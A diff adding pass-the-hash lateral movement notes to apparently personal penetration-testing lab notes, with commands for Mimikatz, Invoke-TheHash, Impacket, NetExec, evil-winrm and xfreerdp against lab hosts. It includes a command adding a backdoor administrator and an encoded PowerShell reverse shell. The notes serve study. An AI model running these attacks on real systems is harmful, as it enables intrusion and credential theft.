@@ -143,6 +143,16 @@
       - [Hunting from Linux](#hunting-from-linux)
         - [Manspider](#manspider)
         - [NetExec](#netexec-2)
+  - [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
+    - [Pass the Hash (_PtH_)](#pass-the-hash-pth)
+      - [Intro to Windows NTLM](#intro-to-windows-ntlm)
+      - [PtH with Mimikatz](#pth-with-mimikatz)
+      - [PtH with PowerShell Invoke-TheHash](#pth-with-powershell-invoke-thehash)
+      - [PtH with Impacket](#pth-with-impacket)
+      - [PtH with NetExec](#pth-with-netexec)
+      - [PtH with evil-winrm](#pth-with-evil-winrm)
+      - [PtH with RDP](#pth-with-rdp)
+      - [UAC Limits PtH for Local Accounts](#uac-limits-pth-for-local-accounts)
 
 ---
 
@@ -3311,3 +3321,193 @@ SMB         10.129.234.121  445    DC01             [*] Spidering .
 
 >[!TIP]
 > Use ```spider_plus``` to download all files matching the pattern. Look at [this](https://medium.com/@ravsau00/password-attacks-credential-hunting-in-network-shares-5bd37d2b120d) or [this](https://www.netexec.wiki/smb-protocol/spidering-shares).
+
+## Windows Lateral Movement Techniques
+
+### Pass the Hash (_PtH_)
+
+A PtH attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker does not need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication procotol, as the password hash remains static for every session until the password session is changed.
+
+Hashes can be obtained in several ways, including:
+
+- Dumping the local SAM database from a compromised host
+- Extracting hashes from the NDTS database on a DC
+- Pulling the hashes from memory
+
+#### Intro to Windows NTLM
+
+Microsoft's Windows New Technology LAN Manager (_NTLM_) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.
+
+With NTLM, passwords storedd on the server and DC are not "salted", which means that an adversary with a password hash can authenticate a session without knowing the original password.
+
+#### PtH with Mimikatz
+
+Mimikatz has a module called "sekurlsa::pth" that allows you to perform a PtH attack by starting a process using the hash of the user's password. To use this module, you will need the following:
+
+- ```/user``` - the user name you want to impersonate
+- ```/rc4``` or ```/NTLM``` - NTLM hash of the user's password
+- ```/domain``` - domain the user to impersonate belongs to (_in the case of a local user account, you can use the computer name, localhost, or a dot_)
+- ```/run``` - the program you want to run with the user's context
+
+```
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+user    : julio
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 64F12CDDAA88057E06A81B54E73B949B
+  |  PID  8404
+  |  TID  4268
+  |  LSA Process was already R/W
+  |  LUID 0 ; 5218172 (00000000:004f9f7c)
+  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
+  \_ kerberos - data copy @ 0000028FC964F288
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
+```
+
+#### PtH with PowerShell Invoke-TheHash
+
+
+Another tool you can use to perform PtH attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing PtH attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash you use to authenticate need to have administrative rights on the target computer.
+
+When using ```Invoke-TheHash```, you have two options: SMB or WMI command execution. To use this tool, you need to speciy the following parameters to execute commands in the target computer:
+
+- ```Target``` - hostname or IP address of the target
+- ```Username``` - username to use for authentication
+- ```Domain``` - domain to use for authentication (_this parameter is unnecessary with local accounts or when using the @domain after the username_)
+- ```Hash``` - NTLM password hash for authentication (_this function will accept either LM:NTLM or NTLM format_)
+- ```Comannd``` - command to execute on the target (_if a command is not specified, the function will check to see if the username and hash have access to WMI on the target_)
+
+SMB:
+
+```ps
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
+VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
+VERBOSE: [*] Trying to execute command on 172.16.1.10
+[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
+```
+
+WMI:
+
+```ps
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+[+] Command executed with process id 520 on DC01
+```
+
+#### PtH with Impacket
+
+Impacket has several tools you can use for different operations such as command execution and credential dumping, enumeration, etc.
+
+Command execution using PsExec:
+
+```bash
+d41y@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.201.126.....
+[*] Found writable share ADMIN$
+[*] Uploading file SLUBMRXK.exe
+[*] Opening SVCManager on 10.129.201.126.....
+[*] Creating service AdzX on 10.129.201.126.....
+[*] Starting service AdzX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19044.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+#### PtH with NetExec
+
+NetExec is a post-exploitation tool that helps automate assessing the security of large AD networks. You can use NetExec to try to authenticate to some or all hosts in a network looking for one host where you can authenticate successfully as a local admin.
+
+```bash
+d41y@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
+SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
+SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
+SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+```
+
+If you want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, you could add ```--local-auth``` to you command. This method is helpful if you obtain a local administrator hash by dumping the local SAM database on one host and want to check how many other hosts you can access due to local admin password reuse.
+
+You can use the option ```-x``` to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration.
+
+Command execution:
+
+```bash
+d41y@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+
+SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+SMB         10.129.201.126  445    MS01            [+] Executed command 
+SMB         10.129.201.126  445    MS01            MS01\administrator
+```
+
+#### PtH with evil-winrm
+
+Evil-WinRM is another tool you can use to authenticate using the PtH attack with PowerShell remoting. If SMB is blocked or you don't have administrative rights, you can use this alternative protocol to connect to the target machine.
+
+```bash
+d41y@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+When using a domain account, you need to include the domain name (_administrator@inlanefreight.htb_).
+
+#### PtH with RDP
+
+You can perform and RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
+
+There a few caveats to this attack:
+
+- **Restricted Admin Mode**, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
+
+![password attacks 7](../../images/password_attacks_7.png)
+
+This can be enabled by adding a new registry key ```DisableRestrictedAdmin``` under ```HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa``` with the value of 0. It can be done using the following command:
+
+```
+c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+Once the registry key is added, you can use xfreerdp with the option ```/pth``` to gain RDP access:
+
+```bash
+d41y@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
+[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
+[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
+...snip...
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+...SNIP...
+```
+
+#### UAC Limits PtH for Local Accounts
+
+UAC (_User Account Control_) limits local users' ability to perform remote administration operations. When the registry key ```HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy``` is set to 0, it means that the built-in local admin account is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
